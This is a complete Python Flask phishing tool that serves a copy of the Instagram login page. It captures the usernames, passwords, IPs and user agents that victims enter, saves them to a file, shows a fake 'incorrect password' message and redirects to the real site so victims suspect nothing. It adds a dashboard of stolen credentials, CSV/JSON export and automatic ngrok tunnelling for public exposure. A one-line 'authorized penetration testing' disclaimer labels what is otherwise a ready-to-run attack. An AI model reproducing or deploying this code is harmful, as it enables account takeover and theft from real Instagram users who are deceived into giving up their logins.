#!/usr/bin/env python3
"""
Instagram Phishing Toolkit v1.0
For authorized penetration testing only
Includes ngrok auto-configuration

Usage: python3 instagram_phisher.py
"""

from flask import Flask, request, render_template_string, redirect, jsonify
import json, os, time, hashlib, threading, subprocess, requests as req
from datetime import datetime

app = Flask(__name__)
app.secret_key = os.urandom(64).hex()

# ============================================================
# CONFIGURATION
# ============================================================
CONFIG = {
    "port": 5000,
    "ngrok_token": "",  # Add your ngrok auth token here
    "data_file": "instagram_captures.json",
    "redirect_url": "https://www.instagram.com",
    "theme_color": "#0095F6",
    "theme_bg": "#ffffff"
}

# ============================================================
# PIXEL-PERFECT INSTAGRAM LOGIN PAGE
# ============================================================

INSTAGRAM_PAGE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Instagram</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(10px); }
            to { opacity: 1; transform: translateY(0); }
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        @keyframes pulse {
            0%, 100% { transform: scale(1); }
            50% { transform: scale(1.02); }
        }
        
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background: #fafafa;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            padding: 20px;
        }
        .container {
            width: 100%;
            max-width: 350px;
            animation: fadeIn 0.5s ease-out;
        }
        .card {
            background: white;
            border: 1px solid #dbdbdb;
            border-radius: 1px;
            padding: 30px 40px 20px;
            text-align: center;
            margin-bottom: 10px;
        }
        .logo {
            margin: 22px auto 12px;
            display: block;
        }
        .logo svg {
            width: 175px;
            height: 51px;
        }
        form {
            margin-top: 24px;
        }
        .input-group {
            margin-bottom: 6px;
            position: relative;
        }
        .input-group input {
            width: 100%;
            padding: 9px 0 7px 8px;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            font-size: 12px;
            background: #fafafa;
            outline: none;
            transition: all 0.2s;
            color: #262626;
        }
        .input-group input:focus {
            border-color: #a8a8a8;
            background: #fff;
        }
        .input-group input::placeholder {
            color: #8e8e8e;
            font-size: 12px;
        }
        .input-group input:focus::placeholder {
            color: #c0c0c0;
        }
        .btn {
            width: 100%;
            padding: 7px 16px;
            background: #0095F6;
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
            margin-top: 12px;
            opacity: 0.7;
            transition: all 0.3s;
        }
        .btn:hover {
            opacity: 1;
        }
        .btn:active {
            opacity: 0.9;
            transform: scale(0.99);
        }
        .btn.loading {
            background: #0095F660;
            pointer-events: none;
        }
        .divider {
            margin: 18px 0;
            display: flex;
            align-items: center;
            color: #8e8e8e;
            font-size: 13px;
            font-weight: 600;
        }
        .divider::before, .divider::after {
            content: '';
            flex: 1;
            border-bottom: 1px solid #dbdbdb;
        }
        .divider::before { margin-right: 18px; }
        .divider::after { margin-left: 18px; }
        .fb-login {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            color: #385185;
            font-size: 14px;
            font-weight: 600;
            text-decoration: none;
            margin: 8px 0;
            cursor: pointer;
        }
        .fb-login svg {
            width: 16px;
            height: 16px;
        }
        .forgot-link {
            display: block;
            margin-top: 12px;
            font-size: 12px;
            color: #00376b;
            text-decoration: none;
        }
        .forgot-link:hover {
            text-decoration: underline;
        }
        .signup-card {
            background: white;
            border: 1px solid #dbdbdb;
            border-radius: 1px;
            padding: 20px 40px;
            text-align: center;
            font-size: 14px;
            color: #262626;
        }
        .signup-card a {
            color: #0095F6;
            font-weight: 600;
            text-decoration: none;
        }
        .signup-card a:hover {
            text-decoration: underline;
        }
        .footer {
            text-align: center;
            margin-top: 20px;
            font-size: 12px;
            color: #8e8e8e;
        }
        .footer a {
            color: #8e8e8e;
            text-decoration: none;
            margin: 0 4px;
        }
        .footer a:hover {
            text-decoration: underline;
        }
        .get-app {
            text-align: center;
            margin-top: 20px;
        }
        .get-app p {
            font-size: 14px;
            color: #262626;
            margin-bottom: 16px;
        }
        .app-badges {
            display: flex;
            justify-content: center;
            gap: 8px;
        }
        .app-badges img {
            height: 40px;
        }
        .meta-footer {
            margin-top: 20px;
            padding: 20px 0;
            text-align: center;
            font-size: 12px;
            color: #8e8e8e;
        }
        .meta-footer a {
            color: #8e8e8e;
            text-decoration: none;
            margin: 0 8px;
        }
        .meta-footer a:hover {
            text-decoration: underline;
        }
        .error-msg {
            background: #fdecea;
            color: #c62828;
            padding: 8px;
            border-radius: 4px;
            font-size: 12px;
            margin-bottom: 10px;
            display: none;
        }
        .spinner {
            display: none;
            width: 18px;
            height: 18px;
            border: 2px solid white;
            border-top: 2px solid transparent;
            border-radius: 50%;
            animation: spin 0.6s linear infinite;
            margin: 0 auto;
        }
        @media (max-width: 450px) {
            body { padding: 0; background: white; }
            .container { max-width: 100%; }
            .card { border: none; padding: 20px; }
            .signup-card { border: none; }
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- Login Card -->
        <div class="card">
            <!-- Instagram Logo -->
            <div class="logo">
                <svg viewBox="0 0 175 39" fill="#262626">
                    <path d="M16.3 6.8c-5.2 0-9.4 4.2-9.4 9.4s4.2 9.4 9.4 9.4 9.4-4.2 9.4-9.4-4.2-9.4-9.4-9.4zm0 15.5c-3.4 0-6.1-2.7-6.1-6.1s2.7-6.1 6.1-6.1 6.1 2.7 6.1 6.1-2.7 6.1-6.1 6.1zm11.9-15.9c0 1.2-1 2.2-2.2 2.2s-2.2-1-2.2-2.2 1-2.2 2.2-2.2 2.2 1 2.2 2.2zm6.6 2.2c-.1-2.5-.7-4.8-2.5-6.5-1.8-1.8-4-2.4-6.5-2.5-2.6-.1-10.4-.1-13 0-2.5.1-4.8.7-6.5 2.5-1.8 1.8-2.4 4-2.5 6.5-.1 2.6-.1 10.4 0 13 .1 2.5.7 4.8 2.5 6.5 1.8 1.8 4 2.4 6.5 2.5 2.6.1 10.4.1 13 0 2.5-.1 4.8-.7 6.5-2.5 1.8-1.8 2.4-4 2.5-6.5.1-2.6.1-10.4 0-13zM33.5 29.3c-.5 1.2-1.5 2.1-2.7 2.7-1.9.7-6.3.5-14.5.5s-12.6.2-14.5-.5c-1.2-.5-2.1-1.5-2.7-2.7-.7-1.9-.5-6.3-.5-14.5s-.2-12.6.5-14.5c.5-1.2 1.5-2.1 2.7-2.7 1.9-.7 6.3-.5 14.5-.5s12.6-.2 14.5.5c1.2.5 2.1 1.5 2.7 2.7.7 1.9.5 6.3.5 14.5s.2 12.6-.5 14.5z"/>
                    <path d="M73.8 12.6h-4.5v-4.1c0-1.1.9-2 2-2h2.5V2.5h-3.9c-3.3 0-6 2.7-6 6v4.1h-2.9v3.9h2.9v14.7h4.5V16.5h3.7l.7-3.9zM87.3 10.7c-1.7 0-3.2.7-4.3 1.8l-.1-1.5h-4v19.2h4.5V19.5c0-2.1 1.7-3.8 3.8-3.8s3.8 1.7 3.8 3.8v10.8H96V18.8c-.1-4.5-3.7-8.1-8.7-8.1zM106.1 10.7c-4.2 0-7.6 3.4-7.6 7.6s3.4 7.6 7.6 7.6 7.6-3.4 7.6-7.6-3.4-7.6-7.6-7.6zm0 12.1c-2.5 0-4.5-2-4.5-4.5s2-4.5 4.5-4.5 4.5 2 4.5 4.5-2 4.5-4.5 4.5zM127.6 10.7c-1.7 0-3.2.7-4.3 1.8l-.1-1.5h-4v19.2h4.5V19.5c0-2.1 1.7-3.8 3.8-3.8s3.8 1.7 3.8 3.8v10.8H136V18.8c0-4.5-3.7-8.1-8.4-8.1zM157.1 14.7c-1.1-2.5-3.6-4.1-6.4-4.1-4.2 0-7.6 3.4-7.6 7.6s3.4 7.6 7.6 7.6c2.8 0 5.3-1.6 6.4-4.1l-3.9-1.7c-.5 1.2-1.7 2-3 2-1.6 0-3-.9-3.6-2.3l10.1-4.3-.6-.7zm-9.8 1.7c.2-1.8 1.7-3.2 3.5-3.2 1.3 0 2.5.7 3 1.9l-6.5 2.7v-1.4zM173.1 14.7c-1.1-2.5-3.6-4.1-6.4-4.1-4.2 0-7.6 3.4-7.6 7.6s3.4 7.6 7.6 7.6c2.8 0 5.3-1.6 6.4-4.1l-3.9-1.7c-.5 1.2-1.7 2-3 2-1.6 0-3-.9-3.6-2.3l10.1-4.3-.6-.7zm-9.8 1.7c.2-1.8 1.7-3.2 3.5-3.2 1.3 0 2.5.7 3 1.9l-6.5 2.7v-1.4z"/>
                </svg>
            </div>
            
            <!-- Error Message -->
            <div class="error-msg" id="errorMsg">Sorry, your password was incorrect. Please double-check your password.</div>
            
            <!-- Login Form -->
            <form method="POST" action="/capture" id="loginForm" autocomplete="off">
                <div class="input-group">
                    <input type="text" name="username" placeholder="Phone number, username or email" 
                           autocorrect="off" autocapitalize="off" required>
                </div>
                <div class="input-group">
                    <input type="password" name="password" placeholder="Password" required>
                </div>
                <button type="submit" class="btn" id="loginBtn">Log In</button>
                <div class="spinner" id="spinner"></div>
            </form>
            
            <!-- Divider -->
            <div class="divider">OR</div>
            
            <!-- Facebook Login -->
            <div class="fb-login">
                <svg viewBox="0 0 16 16" fill="#385185">
                    <path d="M16 8.049c0-4.446-3.582-8.05-8-8.05C3.58 0-.002 3.603-.002 8.05c0 4.017 2.926 7.347 6.75 7.951v-5.625h-2.03V8.05H6.75V6.275c0-2.017 1.195-3.131 3.022-3.131.876 0 1.791.157 1.791.157v1.98h-1.009c-.993 0-1.303.621-1.303 1.258v1.51h2.218l-.354 2.326H9.25V16c3.824-.604 6.75-3.934 6.75-7.951z"/>
                </svg>
                Log in with Facebook
            </div>
            
            <!-- Forgot Password -->
            <a href="#" class="forgot-link" onclick="return false;">Forgot password?</a>
        </div>
        
        <!-- Sign Up Card -->
        <div class="signup-card">
            Don't have an account? <a href="#" onclick="return false;">Sign up</a>
        </div>
        
        <!-- Get App -->
        <div class="get-app">
            <p>Get the app.</p>
            <div class="app-badges">
                <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_ios_english-en.png/180ae7a0bcf7.png" alt="App Store">
                <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_android_english-en.png/e9cd846dc924.png" alt="Google Play">
            </div>
        </div>
        
        <!-- Footer -->
        <div class="footer">
            <a href="#">Meta</a> · <a href="#">About</a> · <a href="#">Blog</a> · 
            <a href="#">Jobs</a> · <a href="#">Help</a> · <a href="#">API</a> · 
            <a href="#">Privacy</a> · <a href="#">Terms</a> · <a href="#">Locations</a> · 
            <a href="#">Instagram Lite</a> · <a href="#">Threads</a> · 
            <a href="#">Contact Uploading & Non-Users</a> · <a href="#">Meta Verified</a>
        </div>
        <div class="meta-footer">
            <a href="#">English</a> · <a href="#">Français (France)</a> · <a href="#">Español</a> · 
            <a href="#">中文(简体)</a> · <a href="#">العربية</a> · <a href="#">Português (Brasil)</a> · 
            <a href="#">Italiano</a> · <a href="#">한국어</a> · <a href="#">Deutsch</a> · 
            <a href="#">日本語</a>
            <br><br>
            <span>English</span> · <span>© 2026 Instagram from Meta</span>
        </div>
    </div>
    
    <script>
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            var username = this.querySelector('input[name="username"]').value.trim();
            var password = this.querySelector('input[name="password"]').value.trim();
            var btn = document.getElementById('loginBtn');
            var spinner = document.getElementById('spinner');
            var errorMsg = document.getElementById('errorMsg');
            
            if (!username || !password) {
                errorMsg.textContent = 'Please fill in all fields.';
                errorMsg.style.display = 'block';
                setTimeout(function() { errorMsg.style.display = 'none'; }, 3000);
                return;
            }
            
            // Show loading state
            btn.textContent = '';
            btn.classList.add('loading');
            spinner.style.display = 'block';
            errorMsg.style.display = 'none';
            
            // Simulate verification delay
            setTimeout(function() {
                // Submit the form
                var form = document.createElement('form');
                form.method = 'POST';
                form.action = '/capture';
                
                var input1 = document.createElement('input');
                input1.type = 'hidden';
                input1.name = 'username';
                input1.value = username;
                form.appendChild(input1);
                
                var input2 = document.createElement('input');
                input2.type = 'hidden';
                input2.name = 'password';
                input2.value = password;
                form.appendChild(input2);
                
                document.body.appendChild(form);
                form.submit();
            }, 1500);
        });
    </script>
</body>
</html>
"""


# ============================================================
# FLASK ROUTES
# ============================================================

@app.route('/')
def index():
    """Serve the Instagram phishing page"""
    return INSTAGRAM_PAGE


@app.route('/capture', methods=['POST'])
def capture():
    """Capture Instagram credentials"""
    username = request.form.get('username', 'unknown')
    password = request.form.get('password', 'unknown')
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    ip = request.remote_addr
    ua = request.headers.get('User-Agent', 'Unknown')
    
    # Create capture record
    capture_data = {
        'id': hashlib.md5(f"{timestamp}{ip}{username}".encode()).hexdigest()[:12],
        'timestamp': timestamp,
        'unix_time': int(time.time()),
        'platform': 'Instagram',
        'ip': ip,
        'user_agent': ua,
        'username': username,
        'password': password
    }
    
    # Save to file
    saves = []
    if os.path.exists(CONFIG['data_file']):
        with open(CONFIG['data_file'], 'r') as f:
            try:
                saves = json.load(f)
            except:
                saves = []
    
    saves.append(capture_data)
    
    with open(CONFIG['data_file'], 'w') as f:
        json.dump(saves, f, indent=2)
    
    # Console notification
    print(f"\n{'='*55}")
    print(f"  📸 INSTAGRAM CREDENTIALS CAPTURED!")
    print(f"{'='*55}")
    print(f"  Time:     {timestamp}")
    print(f"  IP:       {ip}")
    print(f"  Username: {username}")
    print(f"  Password: {password}")
    print(f"  UA:       {ua[:50]}...")
    print(f"{'='*55}\n")
    
    # Flash notification file
    with open('last_capture.txt', 'w') as f:
        f.write(f"Instagram | {username}:{password} | {timestamp}")
    
    # Redirect to real Instagram (victim thinks they just mistyped)
    return f"""
    <!DOCTYPE html>
    <html>
    <head>
        <meta charset="UTF-8">
        <meta http-equiv="refresh" content="2;url={CONFIG['redirect_url']}">
        <title>Redirecting...</title>
        <style>
            body {{
                font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
                background: #fafafa;
                display: flex;
                justify-content: center;
                align-items: center;
                height: 100vh;
                margin: 0;
            }}
            .box {{
                text-align: center;
                padding: 40px;
                background: white;
                border: 1px solid #dbdbdb;
                border-radius: 4px;
            }}
            .spinner {{
                width: 32px;
                height: 32px;
                border: 3px solid #dbdbdb;
                border-top: 3px solid #0095F6;
                border-radius: 50%;
                animation: spin 0.8s linear infinite;
                margin: 20px auto;
            }}
            @keyframes spin {{ 0% {{ transform: rotate(0deg); }} 100% {{ transform: rotate(360deg); }}}}
            p {{ color: #8e8e8e; font-size: 14px; }}
        </style>
    </head>
    <body>
        <div class="box">
            <h2 style="color:#262626;font-weight:400;">Sorry, your password was incorrect.</h2>
            <p>Please double-check your password and try again.</p>
            <div class="spinner"></div>
            <p style="font-size:12px;color:#bbb;">Redirecting to Instagram...</p>
        </div>
    </body>
    </html>
    """


@app.route('/dashboard')
def dashboard():
    """View captured credentials"""
    saves = []
    if os.path.exists(CONFIG['data_file']):
        with open(CONFIG['data_file'], 'r') as f:
            try:
                saves = json.load(f)
            except:
                saves = []
    
    # Get ngrok URL
    ngrok_url = "Not connected"
    try:
        r = req.get("http://localhost:4040/api/tunnels")
        tunnels = r.json().get('tunnels', [])
        for t in tunnels:
            if t.get('proto') == 'https':
                ngrok_url = t.get('public_url', 'Not connected')
                break
    except:
        pass
    
    html = f"""
    <!DOCTYPE html>
    <html>
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Instagram Phisher — Dashboard</title>
        <style>
            * {{ margin: 0; padding: 0; box-sizing: border-box; }}
            body {{
                font-family: 'Courier New', monospace;
                background: #0a0a0f;
                color: #c0c0c0;
                padding: 20px;
            }}
            .container {{ max-width: 1000px; margin: 0 auto; }}
            h1 {{ color: #E4405F; margin-bottom: 5px; font-size: 24px; }}
            .subtitle {{ color: #555; font-size: 12px; margin-bottom: 25px; }}
            .info-bar {{
                background: #0d0d15; border: 1px solid #1e1e2a; border-radius: 6px;
                padding: 15px; margin-bottom: 20px;
                display: flex; gap: 20px; flex-wrap: wrap;
            }}
            .info-item {{ font-size: 12px; color: #888; }}
            .info-item span {{ color: #E4405F; font-weight: bold; }}
            .info-item .green {{ color: #00ff88; }}
            table {{
                width: 100%; border-collapse: collapse; font-size: 12px;
                background: #0d0d15; border: 1px solid #1e1e2a; border-radius: 6px; overflow: hidden;
            }}
            th {{
                background: #0a0a0f; color: #E4405F; padding: 10px 12px;
                text-align: left; border-bottom: 1px solid #E4405F30;
                font-size: 11px; text-transform: uppercase; letter-spacing: 1px;
            }}
            td {{ padding: 8px 12px; border-bottom: 1px solid #1e1e2a; color: #aaa; }}
            tr:hover td {{ background: #E4405F05; }}
            .pass {{ color: #ff6666; font-family: monospace; }}
            .user {{ color: #66b3ff; }}
            .ip {{ color: #888; font-family: monospace; font-size: 11px; }}
            .time {{ color: #555; font-size: 11px; }}
            .stats {{
                display: flex; gap: 15px; margin-bottom: 20px; flex-wrap: wrap;
            }}
            .stat-box {{
                background: #0d0d15; border: 1px solid #1e1e2a; border-radius: 6px;
                padding: 15px 20px; min-width: 120px; text-align: center;
            }}
            .stat-box .num {{ font-size: 24px; font-weight: bold; color: #E4405F; }}
            .stat-box .label {{ font-size: 10px; color: #555; text-transform: uppercase; letter-spacing: 1px; margin-top: 4px; }}
            .actions {{ margin-bottom: 15px; display: flex; gap: 8px; }}
            .actions a {{
                padding: 8px 14px; border: 1px solid #1e1e2a; border-radius: 4px;
                text-decoration: none; color: #888; font-size: 11px; transition: all 0.3s;
            }}
            .actions a:hover {{ border-color: #E4405F40; color: #fff; }}
            .actions a.danger {{ border-color: #E4405F30; color: #E4405F; }}
            .actions a.danger:hover {{ background: #E4405F10; }}
            .empty {{ text-align: center; padding: 40px; color: #555; }}
            .empty .icon {{ font-size: 40px; margin-bottom: 10px; }}
            .ngrok {{ color: #00ff88; font-family: monospace; font-size: 13px; }}
        </style>
    </head>
    <body>
        <div class="container">
            <h1>📸 Instagram Phisher</h1>
            <p class="subtitle">Authorized Penetration Testing — Dashboard</p>
            
            <div class="info-bar">
                <div class="info-item">🔗 Phishing URL: <span class="ngrok">{ngrok_url}</span></div>
                <div class="info-item">📁 Captures: <span>{len(saves)}</span></div>
                <div class="info-item">🌐 Server: <span>http://localhost:{CONFIG['port']}</span></div>
                <div class="info-item">🟢 Status: <span class="green">Active</span></div>
            </div>
            
            <div class="stats">
                <div class="stat-box">
                    <div class="num">{len(saves)}</div>
                    <div class="label">Total Captures</div>
                </div>
                <div class="stat-box">
                    <div class="num">{len(set(c['ip'] for c in saves)) if saves else 0}</div>
                    <div class="label">Unique IPs</div>
                </div>
                <div class="stat-box">
                    <div class="num">{len([c for c in saves if c['password'] != 'unknown']) if saves else 0}</div>
                    <div class="label">Valid Creds</div>
                </div>
                <div class="stat-box">
                    <div class="num">{saves[-1]['timestamp'][:10] if saves else 'N/A'}</div>
                    <div class="label">Latest Capture</div>
                </div>
            </div>
            
            <div class="actions">
                <a href="/export">📥 Export JSON</a>
                <a href="/export?format=csv">📥 Export CSV</a>
                <a href="/clear" class="danger" onclick="return confirm('Delete all {len(saves)} captures?')">🗑️ Clear All</a>
                <a href="/" style="margin-left:auto;">📱 Phishing Page →</a>
            </div>
            
            <table>
                <thead>
                    <tr>
                        <th>Time</th>
                        <th>IP</th>
                        <th>Username / Email</th>
                        <th>Password</th>
                        <th>UA</th>
                    </tr>
                </thead>
                <tbody>
    """
    
    if saves:
        for c in reversed(saves[-30:]):  # Show last 30
            html += f"""
                    <tr>
                        <td class="time">{c['timestamp']}</td>
                        <td class="ip">{c['ip']}</td>
                        <td class="user">{c['username']}</td>
                        <td class="pass">{c['password']}</td>
                        <td style="font-size:10px;color:#555;">{c['user_agent'][:30]}...</td>
                    </tr>
            """
    else:
        html += """
                    <tr>
                        <td colspan="5">
                            <div class="empty">
                                <div class="icon">🎯</div>
                                <p>No captures yet. Share your phishing URL and wait for targets.</p>
                            </div>
                        </td>
                    </tr>
        """
    
    html += """
                </tbody>
            </table>
            <p style="color:#444;font-size:11px;margin-top:10px;">Showing last 30 of """ + str(len(saves)) + """ captures</p>
        </div>
    </body>
    </html>
    """
    
    return html


@app.route('/export')
def export_data():
    """Export captures as JSON or CSV"""
    saves = []
    if os.path.exists(CONFIG['data_file']):
        with open(CONFIG['data_file'], 'r') as f:
            try:
                saves = json.load(f)
            except:
                saves = []
    
    fmt = request.args.get('format', 'json')
    
    if fmt == 'csv':
        import io as io_module
        output = io_module.StringIO()
        writer = csv.writer(output)
        writer.writerow(['Timestamp', 'IP', 'Username', 'Password', 'User-Agent', 'ID'])
        for c in saves:
            writer.writerow([c['timestamp'], c['ip'], c['username'], c['password'], c['user_agent'], c['id']])
        csv_data = output.getvalue()
        return csv_data, 200, {
            'Content-Type': 'text/csv',
            'Content-Disposition': f'attachment; filename=instagram_captures_{int(time.time())}.csv'
        }
    else:
        return json.dumps(saves, indent=2), 200, {
            'Content-Type': 'application/json',
            'Content-Disposition': f'attachment; filename=instagram_captures_{int(time.time())}.json'
        }


@app.route('/clear')
def clear_data():
    """Clear all captured data"""
    if os.path.exists(CONFIG['data_file']):
        os.remove(CONFIG['data_file'])
    if os.path.exists('last_capture.txt'):
        os.remove('last_capture.txt')
    print(f"\n[!] All Instagram captures cleared at {datetime.now().strftime('%H:%M:%S')}")
    return redirect('/dashboard')


@app.route('/stats')
def stats_api():
    """JSON stats for monitoring"""
    saves = []
    if os.path.exists(CONFIG['data_file']):
        with open(CONFIG['data_file'], 'r') as f:
            try:
                saves = json.load(f)
            except:
                saves = []
    
    return jsonify({
        'total': len(saves),
        'time': datetime.now().strftime('%H:%M:%S'),
        'last_capture': saves[-1]['timestamp'] if saves else None,
        'unique_ips': len(set(c['ip'] for c in saves)) if saves else 0
    })


# ============================================================
# NGROK AUTO-CONFIGURATION
# ============================================================

def start_ngrok():
    """Start ngrok tunnel automatically"""
    print("\n[*] Starting ngrok tunnel...")
    
    # Check if ngrok is installed
    try:
        subprocess.run(['ngrok', 'version'], capture_output=True, check=True)
    except (subprocess.FileNotFoundError, subprocess.CalledProcessError):
        print("[!] ngrok not found. Install it: https://ngrok.com/download")
        print("[!] Continuing on localhost only...")
        return None
    
    # Start ngrok
    ngrok_process = subprocess.Popen(
        ['ngrok', 'http', str(CONFIG['port']), '--log=stdout'],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL
    )
    
    # Wait for tunnel to be ready
    time.sleep(3)
    
    # Get the public URL
    try:
        r = req.get("http://localhost:4040/api/tunnels")
        tunnels = r.json().get('tunnels', [])
        for t in tunnels:
            if t.get('proto') == 'https':
                url = t.get('public_url')
                print(f"\n{'='*55}")
                print(f"  🚀 NGROK TUNNEL ACTIVE!")
                print(f"{'='*55}")
                print(f"  Phishing URL: {url}")
                print(f"  Dashboard:    {url}/dashboard")
                print(f"{'='*55}\n")
                return url
    except Exception as e:
        print(f"[!] Could not get ngrok URL: {e}")
        print("[!] Check http://localhost:4040 for status")
    
    return None


# ============================================================
# MAIN
# ============================================================

if __name__ == '__main__':
    print(f"""
{'='*55}
  📸 INSTAGRAM PHISHING TOOLKIT
  {'='*55}
  Authorized Penetration Testing Only
  
  Server: http://localhost:{CONFIG['port']}
  Dashboard: http://localhost:{CONFIG['port']}/dashboard
  {'='*55}
""")
    
    # Start ngrok in background
    ngrok_thread = threading.Thread(target=start_ngrok, daemon=True)
    ngrok_thread.start()
    
    # Run Flask app
    app.run(host='0.0.0.0', port=CONFIG['port'], debug=False)
